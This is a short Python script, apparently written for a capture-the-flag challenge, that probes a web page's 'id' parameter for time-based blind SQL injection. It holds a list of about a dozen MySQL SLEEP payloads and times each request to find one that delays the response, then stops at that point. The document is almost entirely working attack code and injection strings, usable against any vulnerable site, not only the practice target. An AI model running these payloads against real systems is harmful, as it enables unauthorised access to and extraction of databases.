import requests, time, sys

B = 'https://0541b0a5e26f92b4.chal.ctf.ae/'
S = requests.Session()

def elapsed(payload):
    t = time.time()
    try:
        S.get(B, params={'id': payload}, timeout=60)
    except Exception:
        return 99
    return time.time() - t

# ---- 1) calibrate: find a sleep form that actually delays ----
CANDIDATES = [
    "1 AND SLEEP({n})",
    "1) AND SLEEP({n})-- -",
    "1 AND (SELECT SLEEP({n}))",
    "1 AND IF(1=1,SLEEP({n}),0)",
    "(SELECT SLEEP({n}))",
    "1 OR SLEEP({n})",
    "0 OR SLEEP({n})",
    "1 UNION SELECT SLEEP({n})",
    "1;SELECT SLEEP({n})",
    "1' AND SLEEP({n})-- -",
    "1' AND SLEEP({n})#",
    "1 PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x3a,(SELECT SLEEP({n})))),1)",
]
N = 4
print("[*] calibrating sleep oracle...")
worker = None
base = elapsed("1")
print("   baseline:", round(base,2))
for c in CANDIDATES:
    e = elapsed(c.format(n=N))
    print("  ", round(e,2), c)
    if e > base + N - 1.0:
        worker = c
        print("[+] WORKING SLEEP FORM:", c)
        break

if not worker:
    print("[-] No time-based oracle found. Trying boolean via response diff next.")
    sys.exit(2)
